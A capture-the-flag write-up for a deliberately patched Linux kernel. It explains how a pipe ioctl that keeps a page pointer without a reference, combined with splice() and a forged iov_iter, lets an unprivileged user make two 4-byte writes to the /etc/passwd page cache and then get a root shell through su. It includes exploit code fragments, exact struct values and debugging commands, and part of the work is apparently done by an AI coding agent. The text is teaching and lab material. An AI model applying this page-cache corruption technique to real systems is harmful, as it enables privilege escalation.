# Kopi Naught File - Kernel Pwn Writeup

## TL;DR

The patch adds two custom ioctls to `fs/pipe.c`:

- `F_INIT_PAGE`: stores the `struct page *` from the last buffer in a pipe into a global variable, `page_copy`.
- `F_COPY_PAGE`: later copies exactly 4 bytes from a user-controlled `iov_iter` into that stored page at an offset derived from another pipe buffer.

The bug is that `F_INIT_PAGE` saves a raw `struct page *` without taking a reference. That means the kernel later uses a stale page pointer. Instead of trying to win a heap/page reuse race, we can intentionally stash a page-cache page from `/etc/passwd` by using `splice()`, then drain the pipe so the page refcount goes back to 1, satisfying the author's `page_count(page_copy) == 1` check.

After that, `F_COPY_PAGE` gives a controlled 4-byte write into the stashed `/etc/passwd` page-cache page.

The final exploit mutates the current user's passwd line from:

```text
user:x:1337:1337:Linux User,,,:/home/user:/bin/sh
```

into:

```text
user::00000:1337:Linux User,,,:/home/user:/bin/sh
```

Then `/bin/su user` reads the corrupted page cache, sees the target user as UID 0 with an empty password field, and gives a root shell.

Verified result:

```text
~ $ /exploit
...
~ # id
uid=0(root) gid=1337(user) groups=1337(user)
~ # cat /root/flag
TEST_FLAG
```

## Files I looked at first

The important challenge files were:

```text
mrrph.patch
README.md
exploit.c
run.sh
initramfs/init
initramfs/etc/passwd
vmlinux.unstripped
```

`mrrph.patch` is the actual vulnerability. `README.md` contains the hint. `exploit.c` already had the beginning of a passwd UID mutation exploit and a marker comment asking CODEX to continue from there.

The initial `exploit.c` already did this part:

1. Get current UID with `getuid()`.
2. Resolve username with `getpwuid()`.
3. Parse `/etc/passwd`.
4. Find the byte offset of the current user's UID field.
5. Check the UID is 4 digits.

That was an important clue. The previous work was already steering toward a 4-byte `/etc/passwd` page-cache mutation.

## Reading the kernel patch

The patch modifies `fs/pipe.c`:

```c
#define F_INIT_PAGE    0x72548b0
#define F_COPY_PAGE    0x67
struct page *page_copy;
```

It adds a global `struct page *page_copy`.

### F_INIT_PAGE

The first custom ioctl is:

```c
case F_INIT_PAGE:
    mutex_lock(&pipe->mutex);

    if (!page_copy) {
        struct pipe_buffer *buf = pipe_buf(pipe, pipe->head - 1);
        page_copy = buf->page;
    }

    mutex_unlock(&pipe->mutex);

    return page_copy ? 0 : -ENOMEM;
```

This takes the last pipe buffer:

```c
pipe_buf(pipe, pipe->head - 1)
```

and stores:

```c
buf->page
```

in a global.

The important bug: it does not call anything like `get_page(page_copy)`.

So `page_copy` does not own a reference. It is just a borrowed pointer saved globally. Once the pipe buffer is consumed, the pipe will drop its reference, but `page_copy` still points to the same `struct page`.

That gives a stale page pointer primitive.

### F_COPY_PAGE

The second ioctl is:

```c
case F_COPY_PAGE:
    struct iov_iter user_buf;
    struct pipe_buffer *buf;
    size_t len;
    unsigned int offset;
    size_t copied;

    if (!page_copy || page_count(page_copy) != 1)
        return -EINVAL;

    if (copy_from_user(&user_buf, (void __user *)arg, sizeof(user_buf)))
        return -EFAULT;

    mutex_lock(&pipe->mutex);

    if (pipe_empty(pipe->head, pipe->tail)) {
        mutex_unlock(&pipe->mutex);
        return -EINVAL;
    }

    buf = pipe_buf(pipe, pipe->head - 1);
    offset = buf->offset + buf->len;
    len = min_t(size_t, iov_iter_count(&user_buf), PAGE_SIZE - offset);

    if (offset >= PAGE_SIZE || len != 4) {
        mutex_unlock(&pipe->mutex);
        return -EINVAL;
    }

    copied = copy_page_from_iter(page_copy, offset, len, &user_buf);
    page_copy = NULL;

    mutex_unlock(&pipe->mutex);

    return copied;
```

There are several constraints:

1. `page_copy` must be non-NULL.
2. `page_count(page_copy)` must be exactly `1`.
3. The user controls a copied-in `struct iov_iter`.
4. The ioctl must be called on a non-empty pipe.
5. The write offset is not passed directly. It is computed from the last pipe buffer of the pipe used for `F_COPY_PAGE`:

```c
offset = buf->offset + buf->len;
```

6. The write length must be exactly 4:

```c
len = min_t(size_t, iov_iter_count(&user_buf), PAGE_SIZE - offset);
if (offset >= PAGE_SIZE || len != 4)
    return -EINVAL;
```

7. The actual write is:

```c
copy_page_from_iter(page_copy, offset, len, &user_buf);
```

That means:

- destination page: `page_copy`
- destination offset: `offset`
- length: 4
- source: attacker-controlled `iov_iter`

So the challenge gives us a 4-byte write into whatever physical page we can make `page_copy` point to, as long as that page's refcount is 1 at the moment of `F_COPY_PAGE`.

## Small pipe helpers used by the patch

The patch looks short, but three small helpers/macros hide a lot of the pipe behavior:

```c
pipe_buf(pipe, pipe->head - 1)
page_count(page_copy)
pipe_empty(pipe->head, pipe->tail)
```

### `pipe_empty(pipe->head, pipe->tail)`

A Linux pipe is backed by a ring of `struct pipe_buffer` entries. `head` and `tail` are counters into that ring:

```text
tail = next buffer to read
head = next slot to write
```

So an empty pipe is the simple case:

```text
head == tail

pipe buffer ring:

slot 0   slot 1   slot 2   slot 3
 empty   empty    empty    empty
   ^
   |
 head, tail
```

That is what `pipe_empty(head, tail)` checks. In practice, think:

```c
pipe_empty(head, tail) == (head == tail)
```

The exact macro exists so the kernel can hide pipe implementation details, but conceptually it means "there are no pipe buffers available to read."

The vulnerable ioctl rejects that:

```c
if (pipe_empty(pipe->head, pipe->tail))
    return -EINVAL;
```

because it needs at least one pipe buffer to calculate:

```c
offset = buf->offset + buf->len;
```

For the exploit, this is why `ctrl_pipe` cannot be empty. We write `page_off` bytes into it first, so the pipe has a last buffer whose length becomes our desired destination offset.

### `pipe_buf(pipe, pipe->head - 1)`

`pipe_buf(pipe, n)` returns a pointer to one `struct pipe_buffer` entry from the pipe's ring.

The real pipe has a finite array, so `pipe_buf()` also handles wrap-around internally. Conceptually it is like:

```c
&pipe->bufs[n % pipe->ring_size]
```

On real kernels this is usually implemented with a mask because the ring size is power-of-two sized, but the idea is the same: convert the logical pipe counter into an array slot.

The pipe's `head` points to the next free slot, not the last used slot. So the last buffer that was actually inserted is at:

```c
pipe->head - 1
```

Visual example after writing one buffer into an empty pipe:

```text
before write:

slot 0   slot 1   slot 2   slot 3
 empty   empty    empty    empty
   ^
   |
 head, tail

after write(pipe_write_end, "AAAA", 4):

slot 0              slot 1   slot 2   slot 3
 pipe_buffer        empty    empty    empty
 offset = 0
 len    = 4
 page   = anonymous pipe page
   ^                  ^
   |                  |
 tail               head
```

Here, `head` moved forward to slot 1. The buffer we care about is slot 0, which is `head - 1`.

That is why this code gets the newest pipe buffer:

```c
buf = pipe_buf(pipe, pipe->head - 1);
```

There are two places where the patch uses this idea:

```c
/* F_INIT_PAGE */
struct pipe_buffer *buf = pipe_buf(pipe, pipe->head - 1);
page_copy = buf->page;
```

In `F_INIT_PAGE`, this means "save the page pointer from the newest buffer in this pipe."

```c
/* F_COPY_PAGE */
buf = pipe_buf(pipe, pipe->head - 1);
offset = buf->offset + buf->len;
```

In `F_COPY_PAGE`, this means "look at the newest buffer in this pipe, then use the end of that buffer as the write offset."

That is why the exploit uses two different pipes:

```text
page_pipe:
  newest buffer is from splice(/etc/passwd)
  F_INIT_PAGE reads page_pipe's newest buffer
  result: page_copy = /etc/passwd page-cache page

ctrl_pipe:
  newest buffer is from write(ctrl_pipe, "A" * page_off)
  F_COPY_PAGE reads ctrl_pipe's newest buffer
  result: offset = 0 + page_off
```

The same macro is used in both cases, but the meaning is different because we call the ioctls on different pipes.

### `page_count(page_copy)`

`page_count(page)` returns the reference count of a `struct page`. A page cannot be safely freed or reused while something still owns a reference to it.

A rough mental model:

```text
page_count(page) == number of active kernel owners of this page
```

For a file page-cache page, one owner is the page cache itself:

```text
/etc/passwd page-cache page
  refcount includes: page cache
```

When `splice()` puts that page into a pipe, the pipe buffer also holds a reference:

```text
after splice():

/etc/passwd page-cache page
  refcount includes:
    1. page cache
    2. page_pipe's pipe_buffer

page_count(page_copy) would be more than 1 here
```

After `F_INIT_PAGE`, the vulnerable global points at the page:

```text
page_copy ---> /etc/passwd page-cache page
```

but this does not increase the refcount because the patch forgot to call a reference-taking helper such as `get_page()`.

So immediately after `F_INIT_PAGE`, the real ownership still looks like:

```text
/etc/passwd page-cache page
  refcount includes:
    1. page cache
    2. page_pipe's pipe_buffer

page_copy points at it, but does not own it
```

That is why `F_COPY_PAGE` would fail if we called it immediately:

```c
if (!page_copy || page_count(page_copy) != 1)
    return -EINVAL;
```

The pipe buffer is still holding the extra reference.

When the exploit does:

```c
read(page_pipe[0], &dummy, 1);
```

the spliced pipe buffer is consumed, so the pipe drops its reference:

```text
after draining page_pipe:

/etc/passwd page-cache page
  refcount includes:
    1. page cache

page_copy still points at it, but still does not own it

page_count(page_copy) can now be 1
```

That is the exact state the challenge accidentally requires: `page_copy` is still a usable pointer to the `/etc/passwd` page-cache page, but the refcount check sees only the normal page-cache reference.

## Understanding the README hint

The README hint points at:

```text
https://elixir.bootlin.com/linux/v7.0.3/source/fs/pipe.c#L488
```

This is inside Linux pipe implementation, around the pipe write path. The useful similarity is that pipe buffers are wrappers around `struct page *` plus offset/length metadata. Pipe operations constantly move page references around:

- anonymous pipe pages from normal `write(pipefd[1], ...)`
- page-cache pages from `splice(file_fd, ..., pipefd[1], ...)`

That is the core similarity to copy-fail or Dirty Pipe style bugs: a pipe can temporarily hold a page-cache page for a file. If we can then write into that page, we mutate the file's page cache without opening the file writable.

The challenge name also helps:

- "copy fail" in the README description
- `F_COPY_PAGE`
- `copy_page_from_iter`
- pipe code hint

So I interpreted the bug as a page-cache mutation challenge, not a classic `commit_creds(prepare_kernel_cred(NULL))` ROP challenge.

## First mental model

The first exploit attempt in the original `exploit.c` was:

```c
int pipe_A[2];
pipe(pipe_A);
write(pipe_A[1], "A", 1);
ioctl(pipe_A[1], F_INIT_PAGE, 0);
read(pipe_A[0], &dummy, 1);
```

This creates an anonymous pipe page, saves its page pointer, then drains the pipe so the page is freed.

That creates a dangling page pointer. In theory, the next step could be:

1. Free anonymous pipe page.
2. Reclaim that same physical page as `/etc/passwd` page cache.
3. Call `F_COPY_PAGE` to write into it.

But that is a harder route because it needs page allocator grooming. The patch and hint suggested a cleaner route: do not free an anonymous page and hope `/etc/passwd` reuses it. Instead, directly put `/etc/passwd`'s page-cache page into a pipe.

That is what `splice()` is for.

## Why splice is the clean primitive

`splice()` can move data from a file into a pipe without copying the file bytes into userspace. Internally, the pipe buffer can reference the file's page-cache page.

The important difference is:

```text
read(file, user_buf, 1)

file page cache page
        |
        | copy 1 byte
        v
userspace buffer
```

With `read()`, userspace receives a copy of the byte. The pipe never gets a reference to the file's page-cache page.

`splice(file, ..., pipe, ..., 1, 0)` is different:

```text
splice(file_fd, &page_base, pipe_write_end, NULL, 1, 0)

/etc/passwd on disk
        |
        v
kernel page cache
+------------------------------------------------+
| page for file offset 0x0                       |
| "root:x:0:0:root:/root:/bin/sh\nuser:x:1337..." |
+------------------------------------------------+
        ^
        |
pipe_buffer
+------------------+
| page   = same page pointer
| offset = 0
| len    = 1
+------------------+
```

The pipe does not need to contain a private copy of the file data. It can contain a `struct pipe_buffer` that says, roughly: "the byte available to read from this pipe lives at `page + offset`, for `len` bytes."

That pipe buffer has metadata like:

```text
struct pipe_buffer {
    struct page *page;   <-- backing memory page
    unsigned int offset; <-- starting byte inside that page
    unsigned int len;    <-- number of pipe bytes exposed
    ...
}
```

For our exploit, the `len` being 1 does not mean the kernel only knows about one byte of memory. It means the pipe exposes one byte to pipe readers. The `page` pointer still points at the whole 0x1000-byte page-cache page that contains that byte.

That is the key trick:

```text
spliced length       = 1 byte
pipe_buffer->len     = 1
pipe_buffer->page    = pointer to the whole /etc/passwd page-cache page
page_copy after bug  = same pointer
```

For this challenge, that is perfect:

```c
int passwd_fd = open("/etc/passwd", O_RDONLY);
int page_pipe[2];
pipe(page_pipe);
splice(passwd_fd, &page_base, page_pipe[1], NULL, 1, 0);
```

After this, `page_pipe` contains a pipe buffer whose `buf->page` is the page-cache page for `/etc/passwd`.

Then:

```c
ioctl(page_pipe[1], F_INIT_PAGE, 0);
```

stores that page-cache page in the global `page_copy`.

Visualized:

```text
after splice(), before F_INIT_PAGE:

page_pipe
  pipe_buffer
    page  --------+
    len = 1       |
                  v
            /etc/passwd page-cache page
            +--------------------------------------+
            | root:x:0:0:root:/root:/bin/sh\n     |
            | user:x:1337:1337:Linux User...      |
            +--------------------------------------+

after F_INIT_PAGE:

global page_copy --+
                   |
page_pipe          |
  pipe_buffer      |
    page  ---------+
    len = 1        |
                   v
             same /etc/passwd page-cache page
```

Then:

```c
read(page_pipe[0], &dummy, 1);
```

drains the single spliced byte from the pipe. This drops the pipe's reference to the page-cache page.

After the drain:

```text
page_pipe
  empty, so it no longer holds the page reference

global page_copy --+
                   v
             /etc/passwd page-cache page
             +--------------------------------------+
             | root:x:0:0:root:/root:/bin/sh\n     |
             | user:x:1337:1337:Linux User...      |
             +--------------------------------------+
```

This is exactly the weird state we want. `page_copy` still remembers the page pointer because `F_INIT_PAGE` saved it, but the pipe reference is gone, so the `page_count(page_copy) == 1` check can pass.

At that point:

- `page_copy` still points to the page.
- No reference was taken by the vulnerable ioctl.
- The page is still a valid page-cache page.
- The refcount can become exactly 1, satisfying:

```c
page_count(page_copy) == 1
```

That avoided a race or page allocator grooming entirely.

## Debugging the page_count constraint

The check:

```c
if (!page_copy || page_count(page_copy) != 1)
    return -EINVAL;
```

is important because it tells us the author expects the pipe reference to be gone before `F_COPY_PAGE`.

If we call `F_COPY_PAGE` immediately after `F_INIT_PAGE`, while the spliced pipe buffer is still full, the page has an extra reference from the pipe buffer. In that state, `page_count(page_copy)` is not 1, and the ioctl returns `-EINVAL`.

The sequence must be:

1. `splice()` file page into pipe.
2. `F_INIT_PAGE` on that pipe.
3. `read()` from the pipe to consume the pipe buffer.
4. Only then call `F_COPY_PAGE`.

The exploit has this exact sequence in `patch_passwd_4()`:

```c
splice(passwd_fd, &page_base, page_pipe[1], NULL, 1, 0);
ioctl(page_pipe[1], F_INIT_PAGE, 0);
read(page_pipe[0], &dummy, 1);
```

This is why the log says:

```text
[*] drained pipe reference; page_copy should now have refcount 1
```

## Controlling the destination offset

`F_COPY_PAGE` does not take an offset argument.

The destination offset is:

```c
buf = pipe_buf(pipe, pipe->head - 1);
offset = buf->offset + buf->len;
```

This uses the last pipe buffer from the pipe passed to `F_COPY_PAGE`, not necessarily the same pipe used for `F_INIT_PAGE`.

That means we can use two pipes:

- `page_pipe`: only used to stash the destination page.
- `ctrl_pipe`: used to control the destination offset.

For `ctrl_pipe`, we write `N` bytes into a fresh anonymous pipe page. For a normal pipe write into a fresh page:

```text
buf->offset = 0
buf->len    = N
```

Therefore:

```text
offset = 0 + N = N
```

So to write at offset `page_off` inside the stashed page, we do:

```c
fill_pipe_to_offset(ctrl_pipe[1], page_off);
ioctl(ctrl_pipe[1], F_COPY_PAGE, &iter);
```

The helper is:

```c
static void fill_pipe_to_offset(int fd, size_t offset)
{
    char buf[PAGE_SIZE];

    assert(offset < sizeof(buf));
    memset(buf, 'A', sizeof(buf));
    assert(write(fd, buf, offset) == (ssize_t)offset);
}
```

For this challenge, `/etc/passwd` is tiny and the target offsets are inside the first page:

```text
UID field offset = 37
```

So the control pipe gets 35 or 37 bytes, depending on which 4-byte patch is being applied.

## Finding the `/etc/passwd` offset

The existing exploit already had a helper:

```c
static off_t find_uid_offset(const char *username)
```

It reads `/etc/passwd`, finds the current username, parses:

```text
name:x:UID:GID:gecos:home:shell
```

and returns the byte offset of the UID field.

In QEMU, the exploit prints:

```text
[+] user:    user (uid=1337)
[+] /etc/passwd UID field at offset 37
```

So the user line starts like:

```text
user:x:1337:1337:Linux User,,,:/home/user:/bin/sh
```

Indexing the interesting part:

```text
user:x:1337:1337...
0123456789...

relative to line:
0  u
1  s
2  e
3  r
4  :
5  x
6  :
7  1  <-- UID starts here
8  3
9  3
10 7
11 :
12 1  <-- GID starts here
13 3
14 3
15 7
```

The absolute UID offset in the full file is 37 because the root line comes first:

```text
root:x:0:0:root:/root:/bin/sh\n
```

## Forging `struct iov_iter`

One tricky part is that the vulnerable ioctl does this:

```c
struct iov_iter user_buf;

if (copy_from_user(&user_buf, (void __user *)arg, sizeof(user_buf)))
    return -EFAULT;
```

It copies a kernel-internal structure from userspace and then trusts it.

To make `copy_page_from_iter()` copy 4 bytes from our buffer into the page, we need a fake `iov_iter` that represents a plain userspace buffer.

The final fake structure is:

```c
struct fake_iov_iter {
    uint8_t iter_type;
    uint8_t nofault;
    uint8_t data_source;
    uint8_t pad[5];
    size_t iov_offset;
    void *ubuf;
    size_t count;
    unsigned long nr_segs;
};
```

And the values are:

```c
struct fake_iov_iter iter = {
    .iter_type = 0,      /* ITER_UBUF */
    .nofault = 0,
    .data_source = 1,    /* WRITE: copy from iterator into page */
    .iov_offset = 0,
    .ubuf = (void *)bytes,
    .count = 4,
    .nr_segs = 1,
};
```

The values are not arbitrary. They are chosen so the kernel interprets our copied bytes like this:

```text
offset  size  field        value      meaning
0x00    1     iter_type    0          ITER_UBUF
0x01    1     nofault      0          normal user copy path
0x02    1     data_source  1          iterator is a source of bytes
0x03    5     pad          0          align the next field to 8 bytes
0x08    8     iov_offset   0          start at bytes[0]
0x10    8     ubuf         bytes      userspace source pointer
0x18    8     count        4          exactly 4 bytes available
0x20    8     nr_segs      1          one contiguous segment
```

Field by field:

- `iter_type = 0`: Linux 7.0.3 uses `ITER_UBUF` as type 0. This is the simplest iterator kind for us because it means `ubuf` is a direct userspace pointer, not a pointer to a `struct iovec` array. If this were `ITER_IOVEC`, the kernel would interpret the union member differently and our `ubuf = bytes` pointer would not be the direct source buffer we want.
- `nofault = 0`: allow the normal faulting user-copy path. Our `bytes` array is a valid userspace stack buffer, so there is no need to request a no-fault copy path.
- `data_source = 1`: this is the direction bit. `copy_page_from_iter(page, offset, len, &iter)` wants to copy from the iterator into the page. Setting this to 1 marks the iterator as a source. With the wrong direction, the helper will not treat it as the "copy from this userspace buffer" object we need.
- `pad[5] = 0`: these bytes are only there because the first three fields are single-byte fields and the next real field must land at offset `0x08`. The exploit does not care about their content, but zero is the clean value.
- `iov_offset = 0`: start reading at the beginning of `bytes`. If this were 1, the first byte copied would be `bytes[1]`; if it were 4, there would be no useful bytes left for a 4-byte patch.
- `ubuf = (void *)bytes`: this is the actual source address for `ITER_UBUF`. For the first patch it points at `{ ':', '0', '0', '0' }`; for the second patch it points at `{ '0', '0', '0', '0' }`.
- `count = 4`: `F_COPY_PAGE` computes `len = min(iov_iter_count(&user_buf), PAGE_SIZE - offset)` and then requires `len == 4`. Setting `count` to 4 makes `iov_iter_count()` return 4, so the ioctl's length check passes and the write is exactly the primitive size.
- `nr_segs = 1`: one buffer segment. For `ITER_UBUF` this is the natural value. Zero segments would describe no usable segment, while more segments are unnecessary.

So the fake iterator says: "copy 4 bytes, starting at `bytes + 0`, from one normal userspace buffer into the destination page."

This is why the values in `exploit.c` are `0`, `0`, `1`, `0`, `bytes`, `4`, and `1`. They describe the smallest valid source iterator that `copy_page_from_iter()` will accept.

### How I confirmed the structure size

The disassembly of `pipe_ioctl` was useful:

```bash
gdb -q -batch -ex 'disassemble pipe_ioctl' vmlinux.unstripped
```

The important part was:

```asm
mov    edx,0x28
mov    rsi,rbp
mov    rdi,rsp
call   _copy_from_user
```

So the kernel copies `0x28` bytes from userspace for `struct iov_iter`.

That matches the fake struct:

```text
1 + 1 + 1 + 5 + 8 + 8 + 8 + 8 = 40 = 0x28
```

The same disassembly also confirmed that `iov_iter_count()` is effectively reading the `count` field at stack offset `0x18`:

```asm
mov    rcx,QWORD PTR [rsp+0x18]
...
cmp    rax,0x4
jne    error
```

Our fake struct has:

```c
size_t count;
```

at offset `0x18`, so this matches.

## Why the write length must be exactly 4

The patch enforces:

```c
len = min_t(size_t, iov_iter_count(&user_buf), PAGE_SIZE - offset);

if (offset >= PAGE_SIZE || len != 4)
    return -EINVAL;
```

This creates two practical constraints:

1. `count` in the forged iterator must be at least 4.
2. `PAGE_SIZE - offset` must be at least 4.

If `count` is less than 4, `len` is too small.

If the destination offset is too close to the end of the page, `PAGE_SIZE - offset` is too small.

So the exploit checks:

```c
if (page_off == 0 || page_off > PAGE_SIZE - 4) {
    log_fail("unsupported patch page offset: 0x%zx\n", page_off);
    close(passwd_fd);
    return -1;
}
```

The `page_off == 0` case is rejected because with a fresh control pipe, producing destination offset 0 would require an empty pipe, but `F_COPY_PAGE` rejects empty pipes:

```c
if (pipe_empty(pipe->head, pipe->tail))
    return -EINVAL;
```

For this challenge, the offsets are small and safe.

## Building the primitive: `patch_passwd_4()`

The final exploit wraps the primitive as:

```c
static int patch_passwd_4(off_t file_offset, const char bytes[4])
```

It performs one controlled 4-byte patch at a file offset in `/etc/passwd`.

Step by step:

### 1. Open `/etc/passwd` read-only

```c
int passwd_fd = open("/etc/passwd", O_RDONLY);
```

This works because `/etc/passwd` is world-readable.

We do not need write permissions because we mutate the page cache through the vulnerable pipe ioctl.

### 2. Calculate page base and page offset

```c
off_t page_base = file_offset & ~(off_t)(PAGE_SIZE - 1);
size_t page_off = (size_t)file_offset & (PAGE_SIZE - 1);
```

`splice()` operates on file offsets, but `copy_page_from_iter()` writes into a page at an offset inside the page.

For these small files, `page_base` is `0`, and `page_off` is the actual byte offset in `/etc/passwd`.

### 3. Splice one byte from `/etc/passwd` into a pipe

```c
splice(passwd_fd, &page_base, page_pipe[1], NULL, 1, 0);
```

Splicing one byte is enough. The pipe buffer references the page-cache page containing that byte.

We only need the page, not the full file contents.

### 4. Stash the pipe buffer's page

```c
ioctl(page_pipe[1], F_INIT_PAGE, 0);
```

This stores the spliced `/etc/passwd` page-cache page in `page_copy`.

### 5. Drain the pipe

```c
read(page_pipe[0], &dummy, 1);
```

This releases the pipe's reference and makes the page count satisfy the `page_count(page_copy) == 1` check.

### 6. Prepare the control pipe offset

```c
fill_pipe_to_offset(ctrl_pipe[1], page_off);
```

This makes the last pipe buffer in `ctrl_pipe` have:

```text
buf->offset + buf->len = page_off
```

### 7. Forge the iterator

```c
struct fake_iov_iter iter = {
    .iter_type = 0,
    .nofault = 0,
    .data_source = 1,
    .iov_offset = 0,
    .ubuf = (void *)bytes,
    .count = 4,
    .nr_segs = 1,
};
```

### 8. Trigger the 4-byte page-cache write

```c
long copied = ioctl(ctrl_pipe[1], F_COPY_PAGE, &iter);
```

If `copied == 4`, the page-cache mutation succeeded.

## First cashout attempt: UID only

The first natural idea was to change only the UID field:

```text
user:x:1337:1337:...
       ^^^^
```

to:

```text
user:x:0000:1337:...
```

This does work as a page-cache mutation. The QEMU output from that stage was:

```text
~ $ /exploit
[+] user:    user (uid=1337)
[+] /etc/passwd UID field at offset 37
[*] splicing /etc/passwd page at file offset 0x0
[*] stashing page-cache page pointer
[*] drained pipe reference; page_copy should now have refcount 1
[*] preparing write offset 0x25 inside the stashed page
[+] mutated /etc/passwd page cache: user UID -> 0000
[+] cashing out through setuid busybox su
Password:
```

The problem: BusyBox `su` still asked for a password, because the passwd field was still `x`.

The line was:

```text
user:x:0000:1337:...
```

`x` means password authentication is expected through shadow/password handling. In this initramfs there is no known password for `user`, so pressing Enter or typing `user` failed:

```text
su: incorrect password
```

So UID-only mutation was not enough for this environment.

## Second cashout idea: empty passwd field plus UID 0

BusyBox `su` accepts an empty passwd field as no password in this challenge environment.

So the better target is:

```text
user::00000:1337:Linux User,,,:/home/user:/bin/sh
```

This changes two things:

1. Password field becomes empty: `user::...`
2. UID becomes `00000`, which still parses as numeric UID 0.

The hard part is that the primitive writes exactly 4 bytes per call.

Original beginning:

```text
user:x:1337:1337...
```

Target beginning:

```text
user::00000:1337...
```

Using offsets relative to the UID field:

```text
original: user:x:1337:1337
                 ^ uid_offset points to first '1'

absolute bytes around UID:
uid_offset - 2: x
uid_offset - 1: :
uid_offset + 0: 1
uid_offset + 1: 3
uid_offset + 2: 3
uid_offset + 3: 7
uid_offset + 4: :
uid_offset + 5: 1
uid_offset + 6: 3
```

The first 4-byte patch starts at `uid_offset - 2`:

```c
char first_patch[4] = { ':', '0', '0', '0' };
patch_passwd_4(uid_offset - 2, first_patch);
```

That transforms:

```text
x:13
```

into:

```text
:000
```

Intermediate after the first write:

```text
user::00037:1337...
```

The second 4-byte patch in the current `exploit.c` starts at `uid_offset`:

```c
char second_patch[4] = { '0', '0', '0', '0' };
patch_passwd_4(uid_offset, second_patch);
```

That transforms:

```text
0037
```

into:

```text
0000
```

Final:

```text
user::00000:1337...
```

This version does not need to preserve the beginning of the GID because the second write stops before the UID/GID separator. It overwrites bytes `uid_offset` through `uid_offset + 3`; the colon at `uid_offset + 4` remains untouched.

The resulting UID field has five zero characters because the first write changes the original separator at `uid_offset - 1` into `'0'`. That is fine for this challenge: passwd parsing treats `00000` as decimal 0.

## Debugging the off-by-one in the passwd rewrite

My first two-write cashout attempt was slightly wrong. I tried to patch:

```c
char first_patch[4] = { ':', ':', '0', '0' };
char second_patch[4] = { '0', '0', ':', gid_first };
```

This produced:

```text
user:::0000:1337:Linux User,,,:/home/user:/bin/sh
```

QEMU output showed:

```text
su: /etc/passwd: bad record
su: /etc/passwd: bad record
su: unknown user user
```

To debug that, I simply printed the mutated file:

```text
~ $ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
user:::0000:1337:Linux User,,,:/home/user:/bin/sh
```

That made the mistake obvious: I had created three colons after `user`:

```text
user:::0000...
```

The passwd parser interpreted that as malformed because the fields shifted incorrectly. The valid target needed exactly two colons after the username:

```text
user::00000...
```

So the current exploit uses:

```c
char first_patch[4] = { ':', '0', '0', '0' };
char second_patch[4] = { '0', '0', '0', '0' };
```

After that, `su user` worked.

## Final exploit flow

The final exploit does:

1. Resolve the current username and UID.
2. Parse `/etc/passwd` to locate the current user's UID field.
3. Patch 4 bytes at `uid_offset - 2`.
4. Patch 4 bytes at `uid_offset`.
5. Execute `/bin/su user`.

The two patch calls are:

```c
if (patch_passwd_4(uid_offset - 2, first_patch) != 0) return 1;
if (patch_passwd_4(uid_offset, second_patch) != 0) return 1;
```

Each call performs:

```text
open /etc/passwd read-only
splice page into pipe
F_INIT_PAGE to store page-cache page
read pipe to drop the pipe page ref
fill control pipe to desired offset
forge ITER_UBUF iov_iter
F_COPY_PAGE to copy exactly 4 bytes into page cache
```

## Why this works without writing to `/etc/passwd` on disk

The exploit never opens `/etc/passwd` with `O_WRONLY` or `O_RDWR`.

The mutation is in the page cache. Any later kernel read of `/etc/passwd` can see the modified page-cache contents.

That is enough for `/bin/su`, because it reads `/etc/passwd` through normal file APIs. It does not know the file was mutated through a pipe page-cache primitive.

This is why the technique is similar to copy-fail and Dirty Pipe style exploits:

- read-only file
- page-cache page
- pipe buffer references that page
- unexpected write into that page
- privileged program later trusts the corrupted cached file content

## Commands used during debugging

### Inspect the challenge files

```bash
sed -n '1,240p' mrrph.patch
sed -n '1,220p' README.md
sed -n '1,260p' exploit.c
sed -n '1,120p' initramfs/init
sed -n '1,80p' initramfs/etc/passwd
```

These showed:

- The patch only touches `fs/pipe.c`.
- The custom ioctls are pipe ioctls.
- The target runtime user is `user` with UID 1337.
- `/root/flag` is a symlink to `/dev/vda` and is protected with mode `0400`.
- BusyBox is setuid root, so `su` is a good cashout target.

### Check symbols in the unstripped kernel

```bash
nm -n vmlinux.unstripped | rg ' page_copy| pipe_ioctl|copy_page_from_iter|copy_page_to_iter|commit_creds|prepare_kernel_cred'
```

Useful output:

```text
ffffffff814f7370 t pipe_ioctl
ffffffff817db000 T copy_page_from_iter
ffffffff83825228 B page_copy
```

This confirmed:

- The vulnerable logic is inside `pipe_ioctl`.
- `page_copy` exists as a global BSS symbol.
- `copy_page_from_iter` is available and is the function being used.

I did not need kernel ROP symbols like `commit_creds` or `prepare_kernel_cred` for the final route, but checking them helped rule out whether this looked like a conventional control-flow exploit. The patch itself strongly favored a data-only page-cache attack.

### Disassemble `pipe_ioctl`

```bash
gdb -q -batch -ex 'disassemble pipe_ioctl' vmlinux.unstripped
```

The disassembly gave several useful facts:

```asm
mov    edx,0x28
mov    rsi,rbp
mov    rdi,rsp
call   _copy_from_user
```

This confirmed the copied-in `iov_iter` size was `0x28`.

It also showed the count check:

```asm
mov    rcx,QWORD PTR [rsp+0x18]
...
cmp    rax,0x4
jne    error
```

This confirmed that the field at offset `0x18` must be the iterator count, and it must produce length 4.

The call site:

```asm
mov    rdi,QWORD PTR [rip+...]  ; page_copy
mov    rcx,rsp                  ; &user_buf
mov    edx,0x4                  ; len
call   copy_page_from_iter
```

confirmed the argument order:

```c
copy_page_from_iter(page_copy, offset, 4, &user_buf)
```

### Build the exploit

```bash
musl-gcc exploit.c -g -O0 -I/usr/local/include -L/usr/local/lib -lrlstr -static -no-pie -o /tmp/kopi_exploit_test
```

This was used as a quick compile check before repacking the initramfs.

### Repack initramfs

```bash
./compile-exp_compress-cpio.sh exploit.c
```

The script:

1. Builds `exploit.c`.
2. Moves the binary into `initramfs/exploit`.
3. Recreates `initramfs.cpio.gz` with root ownership.

### Run QEMU without the `-S` pause

The provided `run.sh` ends with `-s -S`, which starts the GDB server and pauses the CPU at boot. For smoke testing, I ran the same QEMU command without `-S`:

```bash
qemu-system-x86_64 \
  -cpu qemu64,+smep,+smap,+umip \
  -m 512M \
  -smp 1 \
  -kernel $PWD/bzImage \
  -initrd $PWD/initramfs.cpio.gz \
  -nographic \
  -no-reboot \
  -netdev user,id=net0,dns=8.8.8.8 \
  -device virtio-net-pci,netdev=net0 \
  -append "console=ttyS0 rdinit=/init loglevel=0 oops=panic panic=-1 nokaslr page_table_check=on pti=on" \
  -drive file=$PWD/flag.txt,format=raw,if=none,id=flag,readonly=on \
  -device virtio-blk-pci,drive=flag
```

Then inside the VM:

```sh
/exploit
id
cat /root/flag
```

Final verification:

```text
~ $ /exploit
[+] user:    user (uid=1337)
[+] /etc/passwd UID field at offset 37
[*] splicing /etc/passwd page at file offset 0x0
[*] stashing page-cache page pointer
[*] drained pipe reference; page_copy should now have refcount 1
